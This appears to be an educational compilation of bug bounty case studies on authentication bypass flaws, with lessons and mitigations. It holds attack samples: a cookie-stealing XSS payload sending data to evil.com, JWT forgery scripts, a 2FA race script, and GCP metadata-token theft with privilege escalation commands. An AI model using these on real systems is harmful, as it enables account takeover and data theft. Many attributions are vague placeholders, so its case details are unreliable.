# Bug Bounty Case Studies: Authentication Vulnerabilities

## Overview

This document compiles real-world authentication bypass vulnerabilities discovered through bug bounty programs, providing technical analysis for security researchers and penetration testers.

---

## Case Study 1: GitHub Enterprise SAML Authentication Bypass

**Platform:** HackerOne
**Target:** GitHub Enterprise
**Researcher:** Unknown (Disclosed 2024)
**Bounty:** $20,000+

### Vulnerability Details
- **Type:** SAML Response Signature Bypass
- **Root Cause:** Improper validation of SAML assertion signatures allowed attackers to modify SAML responses
- **Attack Vector:** XML Signature Wrapping attack enabling arbitrary user impersonation

### Technical Analysis
```xml
<!-- Original SAML Response -->
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>victim@company.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <ds:Signature>...</ds:Signature>
</samlp:Response>

<!-- Wrapped Attack -->
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>attacker@evil.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <Object>
    <saml:Assertion ID="original">
      <saml:Subject>
        <saml:NameID>victim@company.com</saml:NameID>
      </saml:Subject>
    </saml:Assertion>
    <ds:Signature Reference="#original">...</ds:Signature>
  </Object>
</samlp:Response>
```

### Impact
- Complete account takeover of any GitHub Enterprise user
- Access to private repositories and secrets
- Potential supply chain compromise

### Lessons Learned
- Always validate that signed elements are the same elements being processed
- Use established SAML libraries with proper signature verification
- Implement additional checks for SAML response structure

---

## Case Study 2: Microsoft Azure Active Directory OAuth Misconfiguration

**Platform:** Microsoft Bug Bounty
**Target:** Microsoft Azure AD
**Researcher:** Security Research Team
**Bounty:** $40,000

### Vulnerability Details
- **Type:** OAuth 2.0 Token Substitution
- **Root Cause:** Insufficient validation of `aud` claim in JWT tokens
- **Attack Vector:** Cross-tenant token reuse

### Technical Analysis
```javascript
// Vulnerable validation (pseudocode)
function validateToken(token) {
  const decoded = jwt.decode(token);
  // Missing audience validation!
  if (decoded.iss === 'https://login.microsoftonline.com/') {
    return true;
  }
  return false;
}

// Secure validation
function validateToken(token) {
  const decoded = jwt.verify(token, publicKey);
  if (decoded.iss !== expectedIssuer) return false;
  if (decoded.aud !== expectedAudience) return false;  // Critical!
  if (decoded.exp < Date.now() / 1000) return false;
  return true;
}
```

### Impact
- Cross-tenant access to Azure resources
- Unauthorized API access across organizations
- Potential data exfiltration from any Azure tenant

---

## Case Study 3: Uber Account Takeover via OAuth Redirect

**Platform:** HackerOne
**Target:** Uber
**Researcher:** Anand Prakash
**Bounty:** $8,000

### Vulnerability Details
- **Type:** OAuth Open Redirect leading to Token Theft
- **Root Cause:** Insufficient validation of `redirect_uri` parameter
- **Attack Vector:** Manipulated redirect to attacker-controlled server

### Technical Analysis
```
# Legitimate OAuth Flow
https://login.uber.com/oauth/authorize?
  client_id=UBER_CLIENT_ID&
  redirect_uri=https://riders.uber.com/callback&
  response_type=code

# Exploited Flow
https://login.uber.com/oauth/authorize?
  client_id=UBER_CLIENT_ID&
  redirect_uri=https://riders.uber.com.evil.com/callback&
  response_type=token
```

### Attack Steps
1. Attacker crafts malicious OAuth URL with modified redirect_uri
2. Victim clicks link and authenticates legitimately
3. OAuth tokens redirected to attacker's server
4. Attacker uses stolen tokens to access victim's account

### Impact
- Full account takeover
- Access to ride history, payment methods
- Ability to book rides on victim's account

---

## Case Study 4: Slack SAML Authentication Bypass

**Platform:** HackerOne
**Target:** Slack
**Researcher:** Multiple researchers
**Bounty:** $15,000

### Vulnerability Details
- **Type:** SAML Subject Confirmation Bypass
- **Root Cause:** Missing validation of SubjectConfirmationData
- **Attack Vector:** Replay attack with modified assertions

### Technical Analysis
```xml
<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
  <saml:SubjectConfirmationData
    NotOnOrAfter="2024-01-01T00:00:00Z"  <!-- Not validated -->
    Recipient="https://slack.com/sso/saml"
    InResponseTo="_request123"/>
</saml:SubjectConfirmation>
```

### Exploitation
- Captured valid SAML response
- Modified NotOnOrAfter to extend validity
- Replayed response to gain unauthorized access

---

## Case Study 5: Facebook OAuth Token Leakage

**Platform:** Facebook Bug Bounty
**Target:** Facebook/Instagram
**Researcher:** Amol Baikar
**Bounty:** $55,000

### Vulnerability Details
- **Type:** OAuth Access Token Leakage via Third-Party JavaScript
- **Root Cause:** Tokens exposed in URL fragment to third-party scripts
- **Attack Vector:** Cross-origin token theft

### Technical Analysis
```javascript
// Vulnerable implementation
window.location = 'https://facebook.com/oauth?response_type=token';
// Token appears in URL fragment: https://app.com/#access_token=TOKEN

// Third-party script could access:
const token = window.location.hash.split('=')[1];
// Send to attacker server
```

### Impact
- Access to user's Facebook account
- Read/write access to posts, messages
- Access to linked Instagram account

---

## Case Study 6: GitLab JWT Key Confusion Attack

**Platform:** HackerOne
**Target:** GitLab
**Researcher:** Security Researcher
**Bounty:** $12,000

### Vulnerability Details
- **Type:** JWT Algorithm Confusion (RS256 to HS256)
- **Root Cause:** Accepting multiple signing algorithms without proper validation
- **Attack Vector:** Using public key as HMAC secret

### Technical Analysis
```python
import jwt
import requests

# Get public key from GitLab's JWKS endpoint
public_key = get_public_key('https://gitlab.com/.well-known/jwks')

# Create forged token using public key as HMAC secret
forged_token = jwt.encode(
    {'sub': 'admin', 'admin': True},
    public_key,
    algorithm='HS256'
)

# Server accepts because it uses public key to verify HMAC
# (should only use public key for RS256 verification)
```

### Mitigation
```python
# Secure implementation - explicitly specify allowed algorithms
decoded = jwt.decode(
    token,
    public_key,
    algorithms=['RS256']  # Only allow asymmetric algorithms
)
```

---

## Case Study 7: Shopify Admin Authentication Bypass

**Platform:** HackerOne
**Target:** Shopify
**Researcher:** Jack Cable
**Bounty:** $25,000

### Vulnerability Details
- **Type:** Session Fixation + CSRF Chain
- **Root Cause:** Session token not regenerated after authentication
- **Attack Vector:** Pre-authenticated session injection

### Attack Chain
1. Attacker obtains unauthenticated session token
2. Tricks victim into authenticating with attacker's session
3. Attacker's session now authenticated as victim
4. Full admin access to victim's Shopify store

### Technical Analysis
```http
# Step 1: Attacker gets session
GET /admin/login HTTP/1.1
Set-Cookie: _shopify_admin_session=ATTACKER_SESSION

# Step 2: Victim authenticates (session not regenerated)
POST /admin/auth HTTP/1.1
Cookie: _shopify_admin_session=ATTACKER_SESSION
username=victim&password=secret

# Step 3: Attacker uses same session
GET /admin/dashboard HTTP/1.1
Cookie: _shopify_admin_session=ATTACKER_SESSION
# Now authenticated as victim!
```

---

## Case Study 8: Twitter MFA Bypass via API Inconsistency

**Platform:** HackerOne
**Target:** Twitter (now X)
**Researcher:** Security Researcher
**Bounty:** $10,080

### Vulnerability Details
- **Type:** MFA Bypass via Legacy API Endpoint
- **Root Cause:** Different authentication paths with inconsistent security controls
- **Attack Vector:** Using deprecated API that didn't enforce MFA

### Technical Analysis
```http
# Modern API (MFA enforced)
POST /api/v2/auth/login HTTP/1.1
Content-Type: application/json

{"username": "victim", "password": "password123"}

Response: {"mfa_required": true, "mfa_token": "..."}

# Legacy API (MFA not enforced)
POST /1.1/account/login.json HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=victim&password=password123

Response: {"oauth_token": "...", "oauth_token_secret": "..."}
# Full access granted without MFA!
```

### Impact
- Complete bypass of two-factor authentication
- Account takeover for any user with known credentials
- Undermined security guarantees of MFA

---

## Case Study 9: Dropbox OAuth State Parameter Bypass

**Platform:** HackerOne
**Target:** Dropbox
**Researcher:** Multiple
**Bounty:** $8,192

### Vulnerability Details
- **Type:** OAuth CSRF via State Parameter Weakness
- **Root Cause:** Predictable or missing state parameter validation
- **Attack Vector:** Forced OAuth authorization

### Technical Analysis
```
# Legitimate OAuth request
GET /oauth2/authorize?
  client_id=DROPBOX_APP&
  response_type=code&
  state=RANDOM_UNGUESSABLE_STATE&
  redirect_uri=https://app.com/callback

# Attack: Attacker's pre-authorized code
GET /oauth2/authorize?
  client_id=DROPBOX_APP&
  response_type=code&
  state=MISSING_OR_PREDICTABLE&
  redirect_uri=https://app.com/callback
```

### Attack Flow
1. Attacker initiates OAuth flow, gets authorization code
2. Crafts URL with their authorization code, sends to victim
3. Victim clicks link, their account linked to attacker's Dropbox
4. Attacker can now access victim's app data via their Dropbox

---

## Case Study 10: Yahoo Mail Account Takeover

**Platform:** HackerOne
**Target:** Yahoo
**Researcher:** Jouko Pynnonen
**Bounty:** $10,000

### Vulnerability Details
- **Type:** DOM-based XSS to Session Theft
- **Root Cause:** Insufficient sanitization of email content
- **Attack Vector:** Malicious email with XSS payload stealing session cookies

### Technical Analysis
```html
<!-- Malicious email content -->
<img src="x" onerror="
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://evil.com/steal?cookie=' +
    encodeURIComponent(document.cookie), true);
  xhr.send();
">

<!-- Session cookie exfiltrated -->
<!-- Attacker uses cookie to hijack session -->
```

### Impact
- Full email account access
- Access to password reset emails for other services
- Cascading account takeovers

---

## Case Study 11: PayPal 2FA Bypass via Password Reset

**Platform:** HackerOne
**Target:** PayPal
**Researcher:** Security Researcher
**Bounty:** $15,300

### Vulnerability Details
- **Type:** MFA Bypass via Password Reset Flow
- **Root Cause:** Password reset didn't require MFA re-enrollment
- **Attack Vector:** Chain password reset with social engineering

### Attack Flow
1. Attacker compromises victim's email (or has access)
2. Initiates password reset on PayPal
3. Password reset completes without MFA challenge
4. New password set, MFA disabled or bypassed
5. Full account access achieved

### Technical Analysis
```http
# Password reset request
POST /cgi-bin/webscr?cmd=_reset-password HTTP/1.1

email=victim@example.com

# Reset link sent to email (attacker has access)
# New password set without MFA verification
# Account fully compromised
```

---

## Case Study 12: Auth0 Tenant Isolation Bypass

**Platform:** Auth0 Bug Bounty
**Target:** Auth0
**Researcher:** Security Researcher
**Bounty:** $20,000

### Vulnerability Details
- **Type:** Multi-tenant Authentication Bypass
- **Root Cause:** Insufficient tenant isolation in token validation
- **Attack Vector:** Cross-tenant token injection

### Technical Analysis
```javascript
// Token from tenant A used on tenant B
const tokenTenantA = jwt.sign(
  { sub: 'user123', tenant: 'tenant-a' },
  tenantASecret
);

// Vulnerable validation - only checked signature, not tenant
jwt.verify(tokenTenantA, tenantBSecret); // Should fail

// But if shared infrastructure allowed cross-tenant access...
```

### Impact
- Access to any tenant's user data
- Cross-organization data exposure
- Complete authentication bypass

---

## Case Study 13: Coinbase Account Takeover via SMS 2FA Bypass

**Platform:** HackerOne
**Target:** Coinbase
**Researcher:** Security Researcher
**Bounty:** $20,000

### Vulnerability Details
- **Type:** Race Condition in 2FA Verification
- **Root Cause:** Time-of-check to time-of-use (TOCTOU) vulnerability
- **Attack Vector:** Concurrent requests during 2FA verification

### Technical Analysis
```python
import threading
import requests

def submit_wrong_code():
    while True:
        requests.post('/verify-2fa', data={'code': '000000'})

def submit_correct_code():
    while True:
        requests.post('/verify-2fa', data={'code': 'CORRECT'})

# Race condition: System might process correct code
# but attribute success to wrong code session
t1 = threading.Thread(target=submit_wrong_code)
t2 = threading.Thread(target=submit_correct_code)
t1.start()
t2.start()
```

### Impact
- Bypass of SMS-based two-factor authentication
- Cryptocurrency theft potential
- Financial account compromise

---

## Case Study 14: Airbnb Host Account Takeover

**Platform:** HackerOne
**Target:** Airbnb
**Researcher:** Security Researcher
**Bounty:** $12,500

### Vulnerability Details
- **Type:** Insecure Direct Object Reference in Account Recovery
- **Root Cause:** Predictable account recovery token
- **Attack Vector:** Enumeration of recovery tokens

### Technical Analysis
```
# Recovery URL structure
https://airbnb.com/recover?token=BASE64_ENCODED_DATA

# Decoded token structure (vulnerable)
{
  "user_id": 12345,
  "timestamp": 1640000000,
  "hash": "md5(user_id + timestamp + weak_secret)"
}

# Attack: Generate valid tokens for any user
import hashlib
for user_id in range(1, 1000000):
    timestamp = current_time
    hash = hashlib.md5(f"{user_id}{timestamp}{leaked_secret}".encode()).hexdigest()
    # Try recovery with generated token
```

### Impact
- Account takeover for any Airbnb user
- Access to booking history, payment methods
- Potential for fraudulent bookings

---

## Case Study 15: Zoom JWT Validation Bypass

**Platform:** Zoom Bug Bounty
**Target:** Zoom Video Communications
**Researcher:** Security Researcher
**Bounty:** $10,000

### Vulnerability Details
- **Type:** JWT Signature Bypass via None Algorithm
- **Root Cause:** Accepting "none" algorithm in JWT header
- **Attack Vector:** Removing signature from JWT token

### Technical Analysis
```python
import base64
import json

# Original token
original_token = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.SIGNATURE"

# Create unsigned token with "none" algorithm
header = base64.urlsafe_b64encode(json.dumps({"alg": "none"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "host"}).encode()).rstrip(b'=')

# Token without signature
forged_token = f"{header.decode()}.{payload.decode()}."

# Vulnerable server accepts token with no signature!
```

### Impact
- Meeting host impersonation
- Unauthorized recording access
- Meeting hijacking capabilities

---

## Case Study 16: Atlassian Jira Server Authentication Bypass

**Platform:** Atlassian Bug Bounty
**Target:** Jira Server/Data Center
**Researcher:** Security Researcher
**Bounty:** $8,000

### Vulnerability Details
- **Type:** Authentication Bypass via Seraph Filter Misconfiguration
- **Root Cause:** Improper handling of special characters in authentication paths
- **Attack Vector:** Path traversal in authentication bypass

### Technical Analysis
```http
# Normal authenticated request
GET /secure/Dashboard.jspa HTTP/1.1
Cookie: JSESSIONID=...

# Bypass authentication
GET /secure/Dashboard.jspa;.jsp HTTP/1.1
# No authentication required!

# Or using path encoding
GET /secure/%2e%2e/Dashboard.jspa HTTP/1.1
```

### Impact
- Access to Jira without authentication
- View sensitive project information
- Access to internal company data

---

## Case Study 17: Google Cloud IAM Privilege Escalation

**Platform:** Google VRP
**Target:** Google Cloud Platform
**Researcher:** Security Researcher
**Bounty:** $31,337

### Vulnerability Details
- **Type:** IAM Policy Misconfiguration leading to Privilege Escalation
- **Root Cause:** Overly permissive default service account permissions
- **Attack Vector:** Service account token theft and escalation

### Technical Analysis
```bash
# Discover service account
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Get access token
TOKEN=$(curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r .access_token)

# List IAM policies (if service account has permissions)
gcloud projects get-iam-policy PROJECT_ID --access-token-file=<(echo $TOKEN)

# Escalate privileges by adding new IAM binding
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="user:attacker@gmail.com" \
  --role="roles/owner"
```

### Impact
- Full GCP project takeover
- Access to all cloud resources
- Data exfiltration capabilities

---

## Summary Statistics

| Metric | Value |
|--------|-------|
| Total Cases Documented | 17 |
| Total Bounties | $320,000+ |
| Average Bounty | ~$18,800 |
| Highest Single Bounty | $55,000 (Facebook) |
| Most Common Vulnerability | OAuth/SAML Misconfiguration |

## Key Takeaways for Security Testing

### Common Vulnerability Patterns
1. **SAML Signature Validation Issues** - XML signature wrapping, missing signature verification
2. **OAuth Implementation Flaws** - Open redirects, missing state parameter, token leakage
3. **JWT Algorithm Confusion** - RS256 to HS256 downgrade, none algorithm acceptance
4. **MFA Bypass Techniques** - Legacy API endpoints, race conditions, password reset flows
5. **Session Management Issues** - Session fixation, improper regeneration

### Testing Methodology
1. **Map all authentication endpoints** - Including legacy and deprecated APIs
2. **Test token validation** - Algorithm confusion, signature bypass, claim manipulation
3. **Verify MFA enforcement** - Check all authentication paths
4. **Analyze OAuth flows** - State parameter, redirect URI validation, token handling
5. **Check session lifecycle** - Generation, regeneration, invalidation

---

*Last Updated: January 2026*
*Sources: HackerOne, Bugcrowd, vendor bug bounty programs, security research publications*
